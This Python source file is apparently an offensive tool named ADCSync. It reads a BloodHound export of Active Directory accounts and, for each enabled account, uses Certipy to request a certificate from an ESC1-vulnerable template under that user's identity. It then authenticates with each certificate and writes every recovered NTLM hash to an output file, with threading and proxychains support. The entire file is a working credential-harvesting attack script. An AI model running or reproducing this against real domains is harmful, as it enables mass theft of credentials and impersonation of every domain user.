import json
import os
import shutil
import subprocess
import logging
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List
from rich.logging import RichHandler

# -------------------- FANCY LOGGING SETUP --------------------
LOG_FILE = "adcsync.log"

# Custom log format (File)
FILE_LOG_FORMAT = "%(asctime)s [%(levelname)s] - %(message)s"
DATE_FORMAT = "%Y-%m-%d %H:%M:%S"

# Custom log format (Console via RichHandler)
CONSOLE_LOG_FORMAT = "[%(levelname)s] - %(message)s"  # No timestamp

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,  # Change to logging.INFO to reduce verbosity
    format=FILE_LOG_FORMAT,
    datefmt=DATE_FORMAT,
    handlers=[
        logging.FileHandler(LOG_FILE, mode="a"),  # File log (detailed)
        RichHandler(
            rich_tracebacks=True,
            markup=True,
            show_time=False,  # Remove timestamp from RichHandler
            show_level=True,  # Keep level names (INFO, SUCCESS, ERROR)
            show_path=False   # Hide file path details
        )
    ]
)

logger = logging.getLogger("ADCSync")

# Define a SUCCESS log level (Between INFO (20) and WARNING (30))
SUCCESS = 25
logging.addLevelName(SUCCESS, "SUCCESS")

def success(self, message, *args, **kwargs):
    if self.isEnabledFor(SUCCESS):
        self._log(SUCCESS, message, args, **kwargs)

logging.Logger.success = success  # Add method to Logger class

# Determine certipy client
certipy_client = shutil.which("certipy") or shutil.which("certipy-ad")
if not certipy_client:
    logger.error("❌ Certipy not found. Please install Certipy before running ADCSync.")
    exit(1)

@dataclass
class AccountInfo:
    spn: str
    domain: str
    sid: str
    username: str
    usernameLower: str
    pfx_filepath: str = ''
    ccache_filepath: str = ''

@dataclass
class AccountList:
    accounts: List[AccountInfo] = field(default_factory=list)

# Create the "certificates" folder if it doesn't exist
certificates_folder = 'certificates'
if not os.path.exists(certificates_folder):
    os.makedirs(certificates_folder)

# Create the "caches" folder if it doesn't exist
caches_folder = 'caches'
if not os.path.exists(caches_folder):
    os.makedirs(caches_folder)

def get_json_data(json_file: str):
    """Load BloodHound JSON data."""
    if not os.path.exists(json_file):
        logger.error(f"❌ Error: File '{json_file}' not found.")
        exit(1)
    try:
        with open(json_file, 'r', encoding='utf-8') as file_obj:
            return json.load(file_obj)
    except json.JSONDecodeError:
        logger.error(f"❌ Error: The file '{json_file}' does not contain valid JSON.")
        exit(1)

def extract_accounts(data):
    """Extract accounts from JSON data."""
    accounts = AccountList()
    try:
        items = data.get('nodes', data.get('data', []))  # Try both structures
        for item in items:
            props = item.get('props') or item.get('Properties')  # Check both keys
            if props and props.get('enabled'):
                name = str(props.get('name', '')).lower()
                sid = props.get('objectid') or item.get('ObjectIdentifier') # check both keys. ObjectIdentifier is for BloodHound-CE users JSON
                baseDomainAD = str(props.get('domain', '')).lower()
                justUsernameLower = str(props.get('samaccountname', '')).lower()
                justUsername = props.get('samaccountname', '')
                accounts.accounts.append(
                    AccountInfo(spn=name, sid=sid, domain=baseDomainAD, username=justUsername, usernameLower=justUsernameLower)
                )
    except (IndexError, KeyError, TypeError) as e:
        logger.error(f"❌ Error extracting accounts: {e}")
        return accounts  # Return empty accounts list if an error occurs

    logger.success(f"✅ Found {len(accounts.accounts)} enabled accounts.")
    return accounts

def get_dc_netbios_from_fqdn(dc_fqdn: str) -> str:
    dc_netbios_domain = dc_fqdn.split('.')[0].lower()
    return dc_netbios_domain

def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output_file, dns_tcp, dns, name_server, timeout, ldap_channel_binding, debug, threads):
    """Retrieve certificates using Certipy."""
    logger.info(f"🔄 Retrieving certificates for {len(accounts.accounts)} accounts...")

    def fetch_cert_and_auth(account):
        upn = f'{account.spn}'
        sid = account.sid
        dc_netbios_domain = get_dc_netbios_from_fqdn(dc_fqdn)
        pfx_file = f"{account.usernameLower}_{dc_netbios_domain}.pfx"
        pfx_filepath = os.path.join(certificates_folder, pfx_file)
        pfx_file_no_domain = f"{account.usernameLower}.pfx"
        pfx_file_no_domain_path = os.path.join(certificates_folder, pfx_file_no_domain)
        # Skip if the certificate file already exists
        if os.path.exists(pfx_file):
            if debug:
                logger.debug(f"skipping {upn}, pfx file already exists")
            account.pfx_filepath = pfx_file
            return account, None, None
        if os.path.exists(pfx_filepath):
            if debug:
                logger.debug(f"skipping {upn}, pfx file already exists")
            account.pfx_filepath = pfx_filepath
            return account, None, None
        if os.path.exists(pfx_file_no_domain_path):
            if debug:
                logger.debug(f"skipping {upn}, pfx file already exists")
            account.pfx_filepath = pfx_file_no_domain_path
            return account, None, None
        if proxychains:
            command = [
                'proxychains4', certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
                  '-template', template, '-upn', upn, '-dns', dc_fqdn, '-sid', sid
            ]
        else:
            command = [
                certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
                  '-template', template, '-upn', upn, '-sid', sid
            ]
        if dns_tcp:
            command.append('-dns-tcp')
        if dns != '':
            command.append('-dns')
            command.append(dns)
        if timeout != '':
            command.append('-timeout')
            command.append(timeout)
        if name_server != '':
            command.append('-ns') # usually the same value as -dc-ip arg
            command.append(name_server)
        if ldap_channel_binding:
            command.append('-ldap-channel-binding')
        if debug:
            print(f'[+] {' '.join(command)}')
        req_process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if "Failed to connect" in req_process.stdout:
            logger.error(f"⏳ Connection failed for account: {account.usernameLower}")
            return None
        
        # Move the generated .pfx file to the "certificates" folder if it exists
        for pfx_filename in os.listdir('.'):
            if pfx_filename.endswith('.pfx') and pfx_filename.startswith(account.usernameLower):
                destination = os.path.join(certificates_folder, pfx_filename)
                account.pfx_filepath = destination
                shutil.move(pfx_filename, destination)
        
        if not account.pfx_filepath.endswith('.pfx'):
            return None
        if proxychains:
            command = f'echo 0 | proxychains4 {certipy_client} auth -pfx {account.pfx_filepath} -domain {account.domain} -dc-ip {dc_ip}'
        else:
            command = f'echo 0 | {certipy_client} auth -pfx {account.pfx_filepath} -domain {account.domain} -dc-ip {dc_ip}'
        if name_server != '':
            command += f' -ns {name_server}'
        if dns_tcp:
            command += ' -dns-tcp'
        if timeout != '':
            command += f' -timeout {timeout}'

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
        stdout, stderr = process.communicate()

        # Move the generated .ccache file to the "caches" folder if it exists
        for ccache_filename in os.listdir('.'):
            if ccache_filename.endswith('.ccache') and ccache_filename.startswith(account.usernameLower):
                ccache_destination = os.path.join(caches_folder, ccache_filename)
                account.ccache_filepath = ccache_destination
                shutil.move(ccache_filename, ccache_destination)
        return account, stdout.strip(), stderr.strip()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(fetch_cert_and_auth, account): account for account in accounts.accounts}
        with open(output_file, 'a') as out_file:
            for future in tqdm(as_completed(futures), total=len(futures), desc="ADCSync ESC1"):
                result = future.result()
                if result:
                    account, stdout, stderr = result
                    if debug:
                        logging.debug(f"[Cert Fetch] {account.username} | {stdout} | {stderr}")
                    if stdout:
                        try:
                            ntlm_hash = stdout.split('\n')[-1].split(': ')[1]
                            out_file.write(f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)\n')
                            out_file.flush()  # Ensure immediate write to file
                            print((f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)\n'))
                        except IndexError:
                            logger.error(f"❌ Error: Failed to parse NTLM hash for {account.username}: {stdout}")

def main(file, output, ca_name, dc_ip, dc_fqdn, user, password, template, target, dns_tcp, dns, name_server, timeout, ldap_channel_binding, debug, proxychains, threads):
    """Main function to extract accounts, retrieve certificates, and authenticate."""

    data = get_json_data(file)
    accounts = extract_accounts(data)

    retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output, dns_tcp, dns, name_server, timeout, ldap_channel_binding, debug, threads)

    logger.success("🎉 ADCSync process completed successfully!")

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description="Retrieve NTLM hashes via ADCS ESC1 technique.")
    parser.add_argument('-f', '--file', help='Input User List JSON file from Bloodhound', required=True)
    parser.add_argument('-o', '--output', help='NTLM Hash Output file', required=True)
    parser.add_argument('-ca-name', help='Certificate Authority', required=True)
    parser.add_argument('-dc-ip', help='IP Address of Domain Controller', required=True)
    parser.add_argument('-dc-fqdn', help='FQDN of Domain Controller', required=True)
    parser.add_argument('-u', '--user', help='Username', required=True)
    parser.add_argument('-p', '--password', help='Password', required=True)
    parser.add_argument('-template', help='Template Name vulnerable to ESC1', required=True)
    parser.add_argument('-target', help='CA FQDN', required=True)
    parser.add_argument('-t', '--threads', type=int, default=4, help='Number of threads to use. (default=4)')
    parser.add_argument('-dns-tcp', action='store_true', help='use dns-tcp for proxychains4')
    parser.add_argument('-dns', help='the DC FQDN, useful for proxychains4')
    parser.add_argument('-ns', '--name-server', help='name server, useful for proxychains, should be the same as the dc-ip value most of the time')
    parser.add_argument('-timeout', help='timeout value for dns resolution, useful for proxychains4')
    parser.add_argument('-ldap-channel-binding', action='store_true', help='useful if target requires ldap channel binding')
    parser.add_argument('-debug', action='store_true', help='Show verbose debugging information')
    parser.add_argument('-proxychains', action='store_true', help='Use proxychains4')

    args = parser.parse_args()
    main(args.file, args.output, args.ca_name, args.dc_ip, args.dc_fqdn, args.user, args.password, args.template, args.target, args.dns_tcp, args.dns, args.name_server, args.timeout, args.ldap_channel_binding, args.debug, args.proxychains, args.threads)

